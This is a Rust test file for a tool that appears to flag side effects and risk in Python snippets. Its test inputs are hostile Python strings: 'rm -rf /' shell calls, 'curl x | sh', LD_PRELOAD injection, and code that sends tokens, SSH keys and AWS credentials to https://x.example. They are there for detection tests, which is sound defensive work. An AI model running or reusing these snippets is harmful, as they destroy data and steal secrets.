//! What the catalogue is expected to notice, and what it is expected to leave
//! alone. These are the claims the tool makes to a reader deciding whether to
//! run something, so they are worth pinning down.

use pyxray_core::model::{Effect, FlowKind, SecretKind, Severity};
use pyxray_core::xray;

fn effects(source: &str) -> Vec<(Effect, Severity, String, Option<String>)> {
    xray(source, "t")
        .effects
        .into_iter()
        .map(|h| (h.effect, h.severity, h.verb, h.target))
        .collect()
}

fn has(source: &str, effect: Effect) -> bool {
    xray(source, "t").effects.iter().any(|h| h.effect == effect)
}

#[test]
fn open_modes_decide_read_versus_write() {
    for (mode, verb) in [
        ("'r'", "read"),
        ("'rb'", "read"),
        ("'w'", "truncate"),
        ("'a'", "append"),
        ("'x'", "create"),
        ("'r+'", "update"),
    ] {
        let hits = effects(&format!("open('f', {mode})"));
        assert_eq!(hits.len(), 1, "mode {mode}");
        assert_eq!(hits[0].2, verb, "mode {mode}");
    }
    // The default is a read, and the path comes through as the target.
    let hits = effects("open('data.csv')");
    assert_eq!(hits[0].0, Effect::FsRead);
    assert_eq!(hits[0].3.as_deref(), Some("data.csv"));
}

#[test]
fn a_mode_given_by_keyword_counts_too() {
    let hits = effects("open('f', mode='w')");
    assert_eq!(hits[0].2, "truncate");
}

#[test]
fn destructive_calls_are_caution() {
    for source in [
        "import shutil\nshutil.rmtree('/data')",
        "import os\nos.remove('/data/x')",
        "from pathlib import Path\nPath('x').unlink()",
    ] {
        let hits = effects(source);
        let hit = hits
            .iter()
            .find(|h| h.0 == Effect::FsDelete)
            .unwrap_or_else(|| panic!("no delete found in:\n{source}"));
        assert_eq!(hit.1, Severity::Caution, "{source}");
    }
}

#[test]
fn a_string_constant_is_shown_rather_than_its_name() {
    let hits = effects("import shutil\nSTAGE = '/tmp/stage'\nshutil.rmtree(STAGE)");
    let hit = hits.iter().find(|h| h.0 == Effect::FsDelete).unwrap();
    assert_eq!(hit.3.as_deref(), Some("/tmp/stage"));
}

#[test]
fn rebinding_a_constant_stops_us_claiming_to_know_it() {
    let report = xray(
        "import shutil\nSTAGE = '/tmp/stage'\nSTAGE = compute()\nshutil.rmtree(STAGE)",
        "t",
    );
    let hit = report
        .effects
        .iter()
        .find(|h| h.effect == Effect::FsDelete)
        .unwrap();
    assert_eq!(hit.target.as_deref(), Some("STAGE"));
}

#[test]
fn a_command_list_reads_as_a_command_line() {
    let hits = effects("import subprocess\nsubprocess.run(['ls', '-la', '/tmp'])");
    let hit = hits.iter().find(|h| h.0 == Effect::Process).unwrap();
    assert_eq!(hit.3.as_deref(), Some("ls -la /tmp"));
}

#[test]
fn hazardous_strings_escalate_the_severity() {
    let hits = effects("import subprocess\nsubprocess.run(['rm', '-rf', '/'])");
    let hit = hits.iter().find(|h| h.0 == Effect::Process).unwrap();
    assert_eq!(hit.1, Severity::Caution);
}

#[test]
fn tls_verification_being_off_is_worth_saying() {
    let report = xray(
        "import requests\nrequests.get('https://h/', verify=False)",
        "t",
    );
    let hit = report
        .effects
        .iter()
        .find(|h| h.effect == Effect::Net)
        .unwrap();
    assert_eq!(hit.severity, Severity::Caution);
    assert!(hit.note.as_ref().unwrap().contains("verify=False"));
}

#[test]
fn a_path_built_with_a_slash_is_still_a_path() {
    assert!(has(
        "from pathlib import Path\nout = Path('r')\n(out / 'x.json').write_text('{}')",
        Effect::FsWrite
    ));
}

#[test]
fn a_distinctive_method_is_caught_even_on_an_unknown_receiver() {
    let hits = effects("stats = whatever()\nstats.to_csv('out.csv')");
    let hit = hits.iter().find(|h| h.0 == Effect::FsWrite).unwrap();
    assert_eq!(hit.3.as_deref(), Some("out.csv"));
}

#[test]
fn a_handle_carries_its_origin_into_the_write() {
    let hits = effects("fh = open('report.txt', 'w')\nfh.write('hello')");
    let write = hits.iter().find(|h| h.2 == "write").unwrap();
    assert_eq!(write.3.as_deref(), Some("open('report.txt', 'w')"));
}

#[test]
fn one_caution_always_reaches_the_check_band() {
    // The compact renders show a band, not a number. If a single destructive
    // call could still come out green, the whole visual language would be
    // lying at exactly the moment it matters.
    for source in [
        "import shutil\nshutil.rmtree('/data')",
        "import subprocess\nsubprocess.run(['ls'])",
        "eval(user_input)",
        "import pickle\npickle.loads(blob)",
    ] {
        let report = xray(source, "t");
        assert!(
            report.band() >= pyxray_core::model::Band::Check,
            "{source} landed in {:?} at risk {}",
            report.band(),
            report.metrics.risk
        );
    }
}

#[test]
fn one_notable_reaches_the_routine_band() {
    for source in [
        "import requests\nrequests.get('https://h/')",
        "import time\ntime.sleep(5)",
        "open('out.txt', 'w')",
    ] {
        let report = xray(source, "t");
        assert!(
            report.band() >= pyxray_core::model::Band::Routine,
            "{source} landed in {:?} at risk {}",
            report.band(),
            report.metrics.risk
        );
    }
}

#[test]
fn quiet_things_stay_quiet() {
    // Pure computation should score nothing worth warning about.
    let report = xray(
        "import math\nxs = [math.sin(i) for i in range(10)]\ntotal = sum(xs)\n",
        "t",
    );
    assert!(report.metrics.risk < 5, "risk was {}", report.metrics.risk);
    assert!(report.meta.synopsis.starts_with("no side effects"));
}

#[test]
fn fetching_and_executing_scores_higher_than_either_alone() {
    let fetch = xray("import requests\nrequests.get('https://h/')", "t")
        .metrics
        .risk;
    let run = xray("import subprocess\nsubprocess.run(['ls'])", "t")
        .metrics
        .risk;
    let both = xray(
        "import requests, subprocess\nr = requests.get('https://h/')\nsubprocess.run([r.text])",
        "t",
    )
    .metrics
    .risk;
    assert!(both > fetch + run - 10, "{both} vs {fetch}+{run}");
}

#[test]
fn third_party_imports_are_flagged_as_such() {
    let report = xray("import os\nimport numpy as np\nimport requests\n", "t");
    let names: Vec<(&str, bool)> = report
        .imports
        .iter()
        .map(|i| (i.module.as_str(), i.third_party))
        .collect();
    assert_eq!(names, [("os", false), ("numpy", true), ("requests", true)]);
}

#[test]
fn imports_inside_a_function_are_marked_deferred() {
    let report = xray("def f():\n    import numpy\n", "t");
    assert!(report.imports[0].deferred);
}

#[test]
fn a_block_does_not_claim_its_children_effects() {
    let report = xray("def f():\n    print(1)\n", "t");
    let def = &report.spine.children[0];
    assert!(def.own_effects.is_empty(), "{:?}", def.own_effects);
    assert!(def.effects.contains(Effect::Stdout));
}

#[test]
fn a_loop_header_keeps_only_its_own_effects() {
    let report = xray("import os\nfor p in os.listdir('.'):\n    print(p)\n", "t");
    let loop_node = &report.spine.children[1];
    assert!(loop_node.own_effects.contains(Effect::FsRead));
    assert!(!loop_node.own_effects.contains(Effect::Stdout));
    assert!(loop_node.effects.contains(Effect::Stdout));
}

#[test]
fn unused_bindings_are_called_out() {
    let report = xray("keep = 1\ndrop = 2\nprint(keep)\n", "t");
    let by = |name: &str| {
        report
            .bindings
            .iter()
            .find(|b| b.name == name)
            .unwrap()
            .dead
    };
    assert!(!by("keep"));
    assert!(by("drop"));
}

#[test]
fn the_call_inventory_drops_uninteresting_methods() {
    let report = xray(
        "import numpy as np\nxs = []\nxs.append(1)\nnp.mean(xs)\n",
        "t",
    );
    let names: Vec<&str> = report
        .symbols
        .iter()
        .map(|s| s.canonical.as_str())
        .collect();
    assert!(names.contains(&"numpy.mean"), "{names:?}");
    assert!(!names.contains(&"xs.append"), "{names:?}");
}

#[test]
fn the_timeline_folds_repeats_and_keeps_the_worst() {
    let report = xray(
        "import shutil\nprint(1)\nprint(2)\nprint(3)\nprint(4)\nshutil.rmtree('/x')\n",
        "t",
    );
    let rows = report.timeline(2);
    assert_eq!(rows.len(), 2);
    assert!(rows.iter().any(|(h, _)| h.effect == Effect::FsDelete));
}

#[test]
fn a_heredoc_with_tabs_and_a_bare_delimiter_still_parses() {
    let (code, label) = pyxray_core::extract_python("python3 <<-PY\nprint(1)\n\tPY\n");
    assert_eq!(code, "print(1)\n");
    assert!(label.contains("PY"), "{label}");
}

#[test]
fn something_that_is_not_a_wrapped_command_comes_back_untouched() {
    let (code, label) = pyxray_core::extract_python("print('already python')\n");
    assert_eq!(code, "print('already python')\n");
    assert_eq!(label, "<stdin>");
}

// ---------------------------------------------------------------- scoping

#[test]
fn a_method_named_eval_does_not_hide_the_builtin() {
    let src = "class Sandbox:\n    def eval(self, x):\n        return x\n\neval(payload)\n";
    let hits = effects(src);
    let hit = hits.iter().find(|h| h.0 == Effect::Dynamic);
    assert!(
        hit.is_some(),
        "module-level eval() must still be seen: {hits:?}"
    );
}

#[test]
fn a_function_named_open_at_module_level_is_not_the_builtin() {
    // The intended shadowing case still holds.
    let src = "def open(p):\n    return p\n\nopen('x', 'w')\n";
    assert!(!has(src, Effect::FsWrite));
}

#[test]
fn a_parameter_named_open_shadows_only_inside_its_function() {
    let src = "def f(open):\n    open('a', 'w')\n\nopen('b', 'w')\n";
    let hits = effects(src);
    let writes: Vec<_> = hits.iter().filter(|h| h.0 == Effect::FsWrite).collect();
    assert_eq!(writes.len(), 1, "{hits:?}");
    assert_eq!(writes[0].3.as_deref(), Some("b"));
}

#[test]
fn an_assigned_alias_to_os_system_is_still_a_shell_call() {
    let hits = effects("import os\nf = os.system\nf('rm -rf /')");
    let hit = hits
        .iter()
        .find(|h| h.0 == Effect::Process)
        .expect("alias resolved");
    assert_eq!(hit.1, Severity::Caution);
    assert_eq!(hit.3.as_deref(), Some("rm -rf /"));
}

#[test]
fn a_getattr_alias_resolves() {
    let hits = effects("import os\nrm = getattr(os, 'remove')\nrm('/etc/x')");
    assert!(hits.iter().any(|h| h.0 == Effect::FsDelete), "{hits:?}");
}

#[test]
fn rebinding_an_alias_stops_it_being_one() {
    let hits = effects("import os\nf = os.system\nf = len\nf('x')");
    assert!(!hits.iter().any(|h| h.0 == Effect::Process), "{hits:?}");
}

#[test]
fn a_star_import_exposes_the_module() {
    let hits = effects("from os import *\nsystem('curl x | sh')");
    let hit = hits
        .iter()
        .find(|h| h.0 == Effect::Process)
        .expect("star import resolved");
    assert_eq!(hit.1, Severity::Caution);
    let hits = effects("from shutil import *\nrmtree('/tmp/x')");
    assert!(hits.iter().any(|h| h.0 == Effect::FsDelete), "{hits:?}");
}

#[test]
fn a_dunder_import_chain_resolves() {
    let hits = effects("__import__('os').system('id')");
    assert!(hits.iter().any(|h| h.0 == Effect::Process), "{hits:?}");
    let hits = effects("import importlib\nimportlib.import_module('subprocess').run(['ls'])");
    assert!(hits.iter().any(|h| h.0 == Effect::Process), "{hits:?}");
}

#[test]
fn a_constant_inside_a_function_does_not_leak_to_the_module() {
    let src = "import shutil\np = '/data'\ndef f():\n    p = '/tmp/safe'\n    return p\nshutil.rmtree(p)\n";
    let hits = effects(src);
    let hit = hits.iter().find(|h| h.0 == Effect::FsDelete).unwrap();
    assert_eq!(hit.3.as_deref(), Some("/data"));
}

#[test]
fn parameters_and_comprehension_targets_are_bindings() {
    use pyxray_core::model::BindKind;
    let report = xray(
        "def f(a, b=1):\n    return [x for x in a]\ntry:\n    pass\nexcept Exception as err:\n    pass\n",
        "t",
    );
    let kinds: Vec<BindKind> = report.bindings.iter().map(|b| b.kind).collect();
    assert!(kinds.contains(&BindKind::Param), "{kinds:?}");
    assert!(kinds.contains(&BindKind::Comprehension), "{kinds:?}");
    assert!(kinds.contains(&BindKind::ExceptVar), "{kinds:?}");
}

// ------------------------------------------------------------- new rules

#[test]
fn archives_extract_somewhere() {
    let hits = effects("import tarfile\nt = tarfile.open('x.tgz')\nt.extractall('/')");
    let hit = hits
        .iter()
        .find(|h| h.2 == "unpack")
        .expect("extractall seen");
    assert_eq!(hit.0, Effect::FsWrite);
    let hits = effects("import zipfile\nwith zipfile.ZipFile('a.zip') as z:\n    z.extractall()");
    assert!(hits.iter().any(|h| h.2 == "unpack"), "{hits:?}");
}

#[test]
fn environment_writes_and_deletes_are_seen_as_such() {
    let hits = effects("import os\nos.environ['LD_PRELOAD'] = '/tmp/x.so'");
    let hit = hits.iter().find(|h| h.0 == Effect::Env).unwrap();
    assert_eq!(hit.2, "setenv");
    assert_eq!(hit.3.as_deref(), Some("LD_PRELOAD"));
    let hits = effects("import os\ndel os.environ['HOME']");
    assert_eq!(
        hits.iter().find(|h| h.0 == Effect::Env).unwrap().2,
        "unsetenv"
    );
    let hits = effects("import sys\nsys.path.insert(0, '/tmp/evil')");
    assert_eq!(
        hits.iter().find(|h| h.0 == Effect::Env).unwrap().2,
        "syspath"
    );
}

#[test]
fn reading_a_secret_from_the_environment_is_caution() {
    for src in [
        "import os\nos.getenv('API_TOKEN')",
        "import os\nos.environ['AWS_SECRET_ACCESS_KEY']",
        "import os\nos.environ.get('GITHUB_PAT')",
    ] {
        let hits = effects(src);
        let hit = hits.iter().find(|h| h.0 == Effect::Env).unwrap();
        assert_eq!(hit.1, Severity::Caution, "{src}");
    }
    let hits = effects("import os\nos.getenv('HOME')");
    assert_eq!(
        hits.iter().find(|h| h.0 == Effect::Env).unwrap().1,
        Severity::Info
    );
}

#[test]
fn constructed_handles_keep_reporting() {
    let hits = effects("import socket\ns = socket.socket()\ns.connect(('h', 80))\ns.sendall(b'x')");
    assert_eq!(
        hits.iter().filter(|h| h.0 == Effect::Net).count(),
        3,
        "{hits:?}"
    );
    let hits = effects("import sqlite3\nc = sqlite3.connect('db')\nc.execute('DROP TABLE t')");
    assert!(hits.iter().any(|h| h.2 == "sql"), "{hits:?}");
    let hits = effects("import subprocess\np = subprocess.Popen(['x'])\np.kill()");
    assert!(hits.iter().any(|h| h.2 == "kill"), "{hits:?}");
    let hits = effects("import requests\ns = requests.Session()\ns.delete('https://h/x')");
    assert!(hits.iter().any(|h| h.2 == "DELETE"), "{hits:?}");
}

#[test]
fn a_path_opened_the_pathlib_way_is_a_file_handle() {
    let hits = effects("from pathlib import Path\nfh = Path('x').open('w')\nfh.write('y')");
    assert!(
        hits.iter()
            .any(|h| h.0 == Effect::FsWrite && h.2 == "write"),
        "{hits:?}"
    );
}

#[test]
fn keyword_hazards_read_non_literals_too() {
    let hits = effects("import subprocess\nsubprocess.run(cmd, shell=use_shell)");
    let hit = hits.iter().find(|h| h.0 == Effect::Process).unwrap();
    assert_eq!(hit.1, Severity::Caution);
    let report = xray(
        "import numpy as np\nnp.load('w.npy', allow_pickle=True)",
        "t",
    );
    let hit = report
        .effects
        .iter()
        .find(|h| h.symbol == "numpy.load")
        .unwrap();
    assert_eq!(hit.effect, Effect::Dynamic);
    assert_eq!(hit.severity, Severity::Caution);
    let report = xray("import yaml\nyaml.load(s, Loader=yaml.Loader)", "t");
    assert!(report.effects[0].note.as_ref().unwrap().contains("Loader"));
    let report = xray("import yaml\nyaml.load(s, Loader=yaml.SafeLoader)", "t");
    assert!(!report.effects[0].note.as_ref().unwrap().contains("Loader="));
    let report = xray("import httpx\nhttpx.get(u, verify=False)", "t");
    assert_eq!(report.effects[0].severity, Severity::Caution);
}

// -------------------------------------------------------------- negatives

#[test]
fn print_with_pip_install_in_it_stays_info() {
    for src in [
        "print('Run: pip install foo')",
        "print('careful with rm -rf')",
        "import logging\nlogging.info('use --force to override')",
    ] {
        let report = xray(src, "t");
        assert!(
            report.effects.iter().all(|h| h.severity == Severity::Info),
            "{src}: {:?}",
            report.effects
        );
        assert_eq!(report.band(), pyxray_core::model::Band::Inert, "{src}");
    }
}

#[test]
fn a_nested_call_does_not_inherit_its_argument_hazards() {
    // The inner `str()` is a no-op; the outer print must not become Caution
    // because a string two levels down mentions sudo.
    let report = xray("print(str('sudo rm -rf /'))", "t");
    assert!(report.effects.iter().all(|h| h.severity == Severity::Info));
}

#[test]
fn a_hundred_prints_is_not_read_it_first() {
    let src = "print(1)\n".repeat(100);
    let report = xray(&src, "t");
    assert!(report.metrics.risk <= 15, "risk {}", report.metrics.risk);
    assert_eq!(report.band(), pyxray_core::model::Band::Inert);
}

#[test]
fn pure_arithmetic_has_no_effects() {
    let report = xray(
        "x = 1 << 2\ny = (x * 3) % 7\nz = [i for i in range(y)]\n",
        "t",
    );
    assert!(report.effects.is_empty(), "{:?}", report.effects);
    assert_eq!(report.metrics.risk, 0);
}

// ----------------------------------------------------------- robustness

#[test]
fn deeply_nested_parens_do_not_overflow() {
    let src = format!("x = {}1{}\n", "(".repeat(5000), ")".repeat(5000));
    let report = pyxray_core::xray_guarded(&src, "deep");
    assert_eq!(report.metrics.lines_total, 1);
}

#[test]
fn deeply_nested_blocks_emit_a_warning_not_a_crash() {
    let mut src = String::new();
    for i in 0..300 {
        src.push_str(&"    ".repeat(i));
        src.push_str("if x:\n");
    }
    src.push_str(&"    ".repeat(300));
    src.push_str("import os; os.system('id')\n");
    let report = pyxray_core::xray_guarded(&src, "deep");
    assert!(
        report
            .diagnostics
            .iter()
            .any(|d| d.message.contains("nested deeper")),
        "{:?}",
        report.diagnostics
    );
}

#[test]
fn a_very_long_attribute_chain_resolves_to_nothing_rather_than_crashing() {
    let src = format!("x{}\n", ".a".repeat(10_000));
    let report = pyxray_core::xray_guarded(&src, "chain");
    assert!(report.effects.is_empty());
}

#[test]
fn a_trailing_newline_does_not_add_a_line() {
    assert_eq!(xray("a = 1\nb = 2\n", "t").metrics.lines_total, 2);
    assert_eq!(xray("a = 1\nb = 2", "t").metrics.lines_total, 2);
    assert_eq!(xray("", "t").metrics.lines_total, 0);
    let report = xray("a = 1\n\n# c\n", "t");
    assert_eq!(report.metrics.lines_blank, 1);
    assert_eq!(report.metrics.lines_comment, 1);
    assert_eq!(report.texture.len(), 3);
}

// ------------------------------------------------------------------ secrets

fn flows(source: &str) -> Vec<(FlowKind, SecretKind, String, Severity)> {
    xray(source, "t")
        .effects
        .into_iter()
        .filter_map(|h| h.flow.map(|f| (f.kind, f.secret, f.source, h.severity)))
        .collect()
}

#[test]
fn env_secret_sent_in_a_header_is_an_exfiltration() {
    let src = "import os, requests\ntok = os.environ.get('GITHUB_TOKEN')\nrequests.post('https://x.example/a', headers={'Authorization': f'Bearer {tok}'})\n";
    let f = flows(src);
    assert_eq!(f.len(), 1, "{f:?}");
    assert_eq!(f[0].0, FlowKind::Exfiltration);
    assert_eq!(f[0].1, SecretKind::Env);
    assert_eq!(f[0].2, "env GITHUB_TOKEN");
}

#[test]
fn a_secret_through_a_dict_built_first_still_counts() {
    let src = "import os, requests\nheaders = {}\nheaders['A'] = os.getenv('API_KEY')\nrequests.get('https://x.example', headers=headers)\n";
    assert_eq!(flows(src).len(), 1);
}

#[test]
fn rebinding_to_something_else_clears_the_secret() {
    let src = "import os, requests\ntok = os.environ['TOKEN']\ntok = 'placeholder'\nrequests.post('https://x.example', data=tok)\n";
    assert!(flows(src).is_empty());
}

#[test]
fn the_length_of_a_secret_is_not_the_secret() {
    let src = "import os, requests\ntok = os.environ['TOKEN']\nrequests.post('https://x.example', json={'n': len(tok)})\n";
    assert!(flows(src).is_empty());
}

#[test]
fn a_secret_read_inside_a_function_stays_there() {
    let src = "import os, requests\ndef f():\n    tok = os.environ['TOKEN']\n    return 1\nrequests.post('https://x.example', data=tok)\n";
    assert!(flows(src).is_empty());
}

#[test]
fn an_ordinary_variable_is_not_a_secret() {
    let src =
        "import os, requests\nh = os.environ['HOME']\nrequests.post('https://x.example', data=h)\n";
    assert!(flows(src).is_empty());
}

#[test]
fn a_key_file_sent_anywhere_is_caution_and_scores_high() {
    let src = "import requests\nrequests.post('https://x.example', data=open('/home/u/.ssh/id_rsa').read())\n";
    let f = flows(src);
    assert_eq!(f.len(), 1, "{f:?}");
    assert_eq!(f[0].1, SecretKind::File);
    assert_eq!(f[0].3, Severity::Caution);
    assert!(xray(src, "t").metrics.risk >= 55);
}

#[test]
fn a_with_block_over_cloud_credentials() {
    let src = "import os, urllib.request\nwith open(os.path.expanduser('~/.aws/credentials')) as fh:\n    body = fh.read()\nurllib.request.urlopen(urllib.request.Request('https://x.example', data=body.encode()))\n";
    let f = flows(src);
    assert!(
        f.iter()
            .any(|x| x.0 == FlowKind::Exfiltration && x.1 == SecretKind::File),
        "{f:?}"
    );
}

#[test]
fn pathlib_read_of_a_dotenv_file() {
    let src = "from pathlib import Path\nimport requests\ndata = Path('.env').read_text()\nrequests.put('https://x.example', data=data)\n";
    assert_eq!(flows(src).len(), 1);
}

#[test]
fn a_secret_in_a_command_line() {
    let src = "import os, subprocess\ntok = os.environ['NPM_TOKEN']\nsubprocess.run(['curl', '-d', tok, 'https://x.example'])\n";
    let f = flows(src);
    assert_eq!(f.len(), 1, "{f:?}");
    assert_eq!(f[0].0, FlowKind::SecretToProcess);
    assert_eq!(f[0].3, Severity::Caution);
}

#[test]
fn the_response_to_an_authenticated_request_is_not_the_token() {
    let src = "import os, requests\ntok = os.environ['TOKEN']\nr = requests.get('https://x.example', headers={'T': tok})\nopen('out.json', 'w').write(r.text)\n";
    let f = flows(src);
    assert_eq!(
        f.len(),
        1,
        "only the request itself carries the token: {f:?}"
    );
    assert_eq!(f[0].0, FlowKind::Exfiltration);
}

#[test]
fn a_proven_flow_replaces_the_co_occurrence_bonus() {
    let flow = "import os, requests\ntok = os.environ['TOKEN']\nrequests.post('https://x.example', data=tok)\n";
    let apart = "import os, requests\ntok = os.environ['TOKEN']\nrequests.post('https://x.example', data='hello')\n";
    let terms = pyxray_core::digest::risk_breakdown(&xray(flow, "t").effects);
    assert!(
        terms
            .iter()
            .any(|(why, _)| why.contains("sent over the network")),
        "{terms:?}"
    );
    assert!(!terms
        .iter()
        .any(|(why, _)| why.contains("environment and network")));
    let terms = pyxray_core::digest::risk_breakdown(&xray(apart, "t").effects);
    assert!(
        terms
            .iter()
            .any(|(why, _)| why.contains("environment and network")),
        "{terms:?}"
    );
}

#[test]
fn risk_is_exactly_the_sum_of_its_breakdown() {
    for src in [
        "print(1)\n",
        "import os\nos.system('ls')\n",
        "import os, requests\nrequests.post('https://x', data=open('/root/.ssh/id_rsa').read())\nos.system('x')\n",
    ] {
        let r = xray(src, "t");
        let sum: u32 = pyxray_core::digest::risk_breakdown(&r.effects).iter().map(|t| t.1).sum();
        assert_eq!(r.metrics.risk as u32, sum.min(100), "{src}");
    }
}

#[test]
fn resolved_keeps_the_whole_url_that_target_shortens() {
    let url = "https://api.example.com/v1/some/very/long/path/that/does/not/fit/in/a/column?x=1";
    let src = format!("import requests\nrequests.get('{url}')\n");
    let hit = &xray(&src, "t").effects[0];
    assert_eq!(hit.resolved.as_deref(), Some(url));
    assert!(hit.target.as_deref().unwrap().len() < url.len());
}

#[test]
fn parsing_an_inline_open_is_one_file_not_two() {
    let r = xray("import json\njson.load(open('cfg.json'))\n", "t");
    assert!(
        r.effects
            .iter()
            .all(|h| h.target.as_deref() == Some("cfg.json")),
        "{:?}",
        r.effects
    );
    assert_eq!(r.meta.synopsis, "reads cfg.json");
}
